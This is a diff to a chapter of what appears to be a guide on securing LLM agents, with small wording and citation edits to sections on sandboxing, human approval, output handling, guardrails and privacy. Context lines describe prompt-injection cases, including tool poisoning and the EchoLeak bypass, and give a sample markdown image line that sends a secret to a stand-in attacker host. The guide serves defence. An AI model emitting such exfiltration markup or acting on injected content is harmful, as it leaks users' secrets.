@@ -103,7 +103,7 @@ The layers run roughly from deterministic (enforced by code) to probabilistic (a
 
 - **Least privilege and scoped tools.** `send_invoice_reminder(customer_id)` can't be aimed at an attacker; `send_email(to, body)` can. Default to read-only, split read tools from write tools ([§10](10-tool-use.md)), and scope credentials to the user and task ([§33](33-agent-identity.md)).
 - **Sandboxing.** Isolate filesystem and network together, and keep secrets outside ([§20](20-agent-runtime.md)).
-- **Human approval for consequential actions,** a checker who isn't the maker (P8). Show the **full arguments**, because Invariant's tool-poisoning demo hid stolen data behind a simplified dialog. Keep approvals rare, or **approval fatigue** sets in and people click yes unread (OWASP ASI09).
+- **Human approval for consequential actions,** a checker who isn't the maker (P8). Show the **full arguments**, because Invariant's tool-poisoning demo hid stolen data behind a simplified dialog. Keep approvals rare, or **approval fatigue** sets in and people click yes unread, the weakness OWASP ASI09 (Human-Agent Trust Exploitation) describes attackers exploiting.
 - **Egress controls.** A proxy that permits only listed destinations cuts the third leg whatever the model was told.
 - **Output handling.** Model output is untrusted input to its consumer (OWASP LLM05:2025). Never `eval` it or splice it into a shell, SQL or HTML. Watch for **markdown image exfiltration**: an injected model writes `![x](https://attacker.example/p.png?d=SECRET)`, the client renders it, and the browser's image fetch carries the secret out with no tool call at all. In **EchoLeak** (CVE-2025-32711, Microsoft 365 Copilot, fixed by Jun 2025), reference-style markdown slipped past the link filter, and an open redirect on an allow-listed Teams domain got past the Content Security Policy. Render images and links only from allow-listed domains, and strip URLs that carry data.
 - **The dual-LLM pattern and CaMeL.** Willison's **dual-LLM pattern** (Apr 2023) gives tools to a **privileged LLM** that sees only trusted input. A **quarantined LLM** with no tools reads untrusted content, and plain code stores its outputs as opaque variables (`$VAR1`) that the privileged model can route but never read. The **CaMeL** paper (Debenedetti et al., Google DeepMind and ETH Zurich, Mar 2025) identified a flaw. If the quarantined model extracts "Bob's address" from a malicious document, the attacker picks the address. CaMeL's fix:
@@ -166,7 +166,7 @@ The first send is allowed; the second is blocked because the context is tainted.
 
 ### 6. Guardrails
 
-A **guardrail** is a check outside the main model call, on inputs, outputs or tool calls, that can block, redact or reroute. **Input classifiers** flag jailbreak or injection patterns and enforce **topic restrictions**. **Output classifiers** flag harmful content (Meta's open Llama Guard model is one) and check format. **PII detection** finds personal data such as emails, phone numbers and IDs with regexes plus named-entity models (Microsoft's open-source Presidio), then redacts it. **Policy checks** are deterministic rules: the gate above, spend caps, schema validation ([§6](06-structured-outputs.md)).
+A **guardrail** is a check outside the main model call, on inputs, outputs or tool calls, that can block, redact or reroute. **Input classifiers** flag jailbreak or injection patterns and enforce **topic restrictions**. **Output classifiers** flag harmful content (Meta's open Llama Guard model is one) and check format. **PII detection** finds personal data such as emails, phone numbers and IDs with regexes plus named-entity models (the open-source Presidio, which began at Microsoft and is now published by Data Privacy Stack), then redacts it. **Policy checks** are deterministic rules: the gate above, spend caps, schema validation ([§6](06-structured-outputs.md)).
 
 The **OpenAI Agents SDK** builds in three kinds:
 - **Input guardrails** run only for the first agent in a chain.
@@ -197,7 +197,7 @@ Make it **continuous**, as an eval suite ([§26](26-evals.md)). Run it in CI aga
 - **Cross-user leakage:** retrieval that ignores the end user's permissions ([§9](09-rag.md)), shared memory, or credentials cached across tasks (ASI03).
 - **Hidden context:** assume the system prompt will be revealed, and keep secrets out of all context ([§33](33-agent-identity.md)).
 - **Logs and traces** fill with PII ([§27](27-observability.md)). Redact them and set retention.
-- **Provider retention and training:** read data-use terms. Major vendors' commercial API terms generally exclude training on API traffic by default, and consumer apps may differ **(⚠ verify per vendor and plan)**.
+- **Provider retention and training:** read data-use terms. Anthropic's commercial terms say it "may not train models on Customer Content", and OpenAI says API data is not used for training unless you opt in. Consumer apps and other vendors may differ, so check each vendor and plan.
 - **Memorization:** models can reproduce training data (Carlini et al., Dec 2020), so a model fine-tuned on customer data ([§29](29-adapting-models.md)) can leak it to anyone who queries it.
 
 ### 10. Incident response
@@ -322,7 +322,9 @@ Behavior is probabilistic (P4), so you need attack success *rates* over many tri
 - Claude Code docs, Hooks: https://code.claude.com/docs/en/hooks
 - Anthropic, "Constitutional Classifiers: Defending against universal jailbreaks" (Feb 3, 2025): https://www.anthropic.com/research/constitutional-classifiers
 - Inan et al., "Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations" (Dec 2023): https://arxiv.org/abs/2312.06674
-- Presidio docs: https://data-privacy-stack.github.io/presidio/
+- Presidio docs (Data Privacy Stack): https://presidio.dataprivacystack.org/
+- Anthropic, Commercial Terms of Service (training on Customer Content): https://www.anthropic.com/legal/commercial-terms
+- OpenAI docs, Your data (API data and training): https://developers.openai.com/api/docs/guides/your-data
 - Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks" (Apr 1, 2025): https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
 - Snyk, "ToxicSkills" (Feb 5, 2026): https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
 - Spracklen et al., "We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs" (Jun 2024, v3 Mar 2025): https://arxiv.org/abs/2406.10279
